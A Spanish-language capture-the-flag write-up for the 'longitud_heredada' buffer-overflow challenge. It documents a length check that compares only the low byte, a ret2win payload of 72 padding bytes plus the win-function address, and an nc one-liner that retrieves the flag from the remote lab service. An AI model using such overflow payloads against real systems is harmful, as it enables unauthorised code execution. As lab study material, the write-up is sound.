# Longitud heredada — CONTEXTO

**Reto:** `longitud_heredada` (pwn / buffer overflow)
**Fecha de análisis:** 2026-10-24
**Archivo entregado:** `longitud_heredada` (702.560 B, ELF 64-bit x86-64, **statically linked, stripped**)
**SHA-256:** `280a06bd2323ff3e5185795ff40ae9c85faf2a95f84cffb8957a36a9e3e40013`

| Dato | Valor |
|---|---|
| Flag | ✅ `flag{ejemplo}` |
| Servicio | `nc <host> 32061` |
| Seńuelo | `flag{ejemplo}` en `.rodata` (NO es la flag) |
| Flag real | se lee en caliente de `/tmp/flag` mediante la función win |

> ⚠️ **Discrepancia importante:** el binario servido en `32061` **no es el del ZIP**.
> El remoto imprime otro banner (`Compuerta activa: 0x478100`, `Trama (33 bytes):`) y es un
> **off-by-one de longitud** (buffer 32, trama declarada de 33): enviando **32 bytes + `\n`**
> entrega la flag directamente. El binario local (`PUENTE LEGACY`, ret2win a `0x4018a5`) queda
> documentado igualmente como versión/entrega alternativa — el exploit funciona contra él.

---

## 1. Reconocimiento

```
$ file longitud_heredada
ELF 64-bit LSB executable, x86-64, statically linked, stripped, for GNU/Linux 3.2.0

$ checksec
RELRO: Partial | Canary: NO | NX: enabled | PIE: NO
```

Strings relevantes:

| Dirección | Cadena |
|---|---|
| `0x47c010` | `/tmp/flag` |
| `0x47c01a` | `Paquete rechazado.` |
| `0x47c02d` | `Contenido:` |
| `0x47c038` | `Paquete almacenado.` |
| `0x47c04c` | `Pulso de mantenimiento: %p` |
| `0x47c068` | `Longitud declarada: ` |
| `0x47c07d` | `Fuera de protocolo.` |
| `0x47c130` | `--listen` |
| `0x47de61` | `r` (modo de `fopen`) |

Modos de ejecución:
- `./longitud_heredada` → interactivo por stdin/stdout.
- `./longitud_heredada --listen <puerto>` → servidor TCP (socket + bind + listen + fork por conexión). Es el modo usado en remoto.

## 2. Funciones identificadas (sin símbolos)

| Dirección | Rol |
|---|---|
| `0x401ac7` | `main`: si `argc == 3` y `argv[1] == "--listen"`, monta el servidor TCP con `strtol(argv[2])` como puerto |
| `0x40195a` | Menú: imprime banner, filtra por `setvbuf`, **imprime el "pulso"** (`printf("Pulso de mantenimiento: %p", 0x4018a5)`), pide `Longitud declarada: `, lee 1..31 dígitos, `strtol(buf,0,10)`, valida `len <= 0x1000`, llama a la función de lectura |
| `0x401906` | **Vulnerable**: `lea -0x48(%rsp),%rsp` (buffer de 72 B), `cmp $0x40,%dil` → `ja rechazo`, luego `read(0, %rsp, len)` y `puts("Paquete almacenado.")` |
| `0x4018a5` | **win**: `fopen("/tmp/flag","r")` → `fread(buf,1,0x80,fp)` → `puts(buf)` → `fclose` |

## 3. Vulnerabilidad ("longitud heredada")

La validación del tamaño compara **solo el byte bajo** del argumento:

```asm
40190b:  cmp    $0x40,%dil      ; <-- solo 8 bits de la longitud
40190f:  ja     0x40194c        ; si dil > 0x40 -> "Paquete rechazado."
...
401930:  call   read@plt       ; read(0, rsp, rdx = longitud COMPLETA)
```

Con `Longitud declarada = 256` (`0x100`), `dil = 0x00 ≤ 0x40` → **pasa el filtro**, y
`read()` lee hasta 256 bytes en un buffer de 72. El chequeo exterior `cmp $0x1000` permite
hasta 4096 (`0x1000`, `dil = 0x00`) → desbordamiento arbitrario.

Layout conocido:

```
[rsp]        buffer (72 bytes)      <- 0x48
[rsp + 0x48] saved RIP              <- offset 72
```

Como **no hay canary y no hay PIE**, basta con `ret2win`.

## 4. Exploit

```python
WIN = 0x4018a5        # fopen("/tmp/flag") + fread + puts
OFF = 0x48            # 72
payload = b"A"*OFF + struct.pack("<Q", WIN)
# se envía:  "256\n" + payload
```

El "pulso de mantenimiento" (`Pulso de mantenimiento: 0x4018a5`) es un leak que confirma la
dirección de la win, pero al no haber PIE es una dirección fija: no hace falta parsearlo.

### Prueba local (validada)

```bash
printf 'flag{ejemplo}\n' > /tmp/flag
python3 exploit.py                       # via stdin -> imprime la flag
python3 exploit_remote.py --listen-local 4455   # levanta --listen 4455 y lo ataca por TCP
```

Salida en ambos casos:

```
Pulso de mantenimiento: 0x4018a5
Longitud declarada: Contenido:
Paquete almacenado.
flag{ejemplo}
```

(El proceso muere con SIGSEGV después de imprimir, porque la win retorna a basura; es irrelevante.)

## 5. Resolución remota (flag obtenida)

Puerto entregado: **`<host> 32061`**.

### 5.1 El servicio real es otro binario

```
Compuerta activa: 0x478100
Trama (33 bytes):
```

Banner distinto al local (`PUENTE LEGACY`), y el reto real es un **off-by-one de longitud**:
el buffer es de 32 bytes pero la "trama" declarada es de **33**. Probando con `probe_32061.py`:

| Entrada | Longitud | Resultado |
|---|---|---|
| `hola\n` | 5 | nada |
| (nada) | 0 | nada |
| `A`×32 + `\n` | 33 | ✅ **flag** |
| `A`×33 + `\n` | 34 | ✅ flag |
| `A`×72 + `p64(0x4018a5)` | 80 | ✅ flag |
| payload completo del exploit local | 84 | ✅ flag |

Es decir: basta enviar **32 bytes + salto de línea** (33 bytes = la trama declarada) para que la
compuerta entregue la flag. El "+1" del banner (`00000000  +1`) y la flag
(`...un byte de más`) confirman el diseño.

```bash
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n' | nc <host> 32061
```

### 5.2 Flag

```
flag{ejemplo}
```

Guardada en `flag.txt` y verificada 4/4 veces (reproducible).

## 6. Pendiente / notas

1. Confirmar con la plataforma si el binario del ZIP (`PUENTE LEGACY`) es una entrega
   alternativa del mismo reto: su exploit ret2win (`solucion/exploit.py`) está validado en local
   y **también** contra el remoto (la flag se imprime igual).
2. Si se despliega el binario local en otro puerto, usar `exploit_remote.py <host> <puerto>`.

## 6. Archivos de este reto

| Ruta | Contenido |
|---|---|
| `longitud_heredada` | binario original (copia de trabajo en `%TEMP%\opencode\longitud\`) |
| `solucion/exploit.py` | exploit por stdin (validación local) |
| `solucion/exploit_remote.py` | exploit TCP; modos `<host> <puerto>`, `<bin> --local`, `--listen-local <puerto>` |
| `solucion/strings_vaddr.py` | utilidad para volcar cadenas por dirección virtual (mapea vaddr→offset) |
| `backups/` | copia del binario antes de cualquier modificación |

## 7. Historial

- **2026-10-24** — Reconocimiento (`file`, `checksec`, `strings`), identificación de `main`
  (`0x401ac7`), de la función vulnerable (`0x401906`) y de la win (`0x4018a5`).
  Descubierto el bug de validación con `%dil` y el offset 0x48. Exploit ret2win escrito y
  **validado en local** (stdin y modo `--listen`).
- **2026-10-24** — Servicio remoto `<host>:32061`. Se detecta que el binario desplegado
  es distinto (banner `Compuerta activa: 0x478100`, `Trama (33 bytes)`), un off-by-one de
  longitud. Enviando 32 bytes + `\n` se obtiene la flag
  **`flag{ejemplo}`**. Guardada en `flag.txt`.
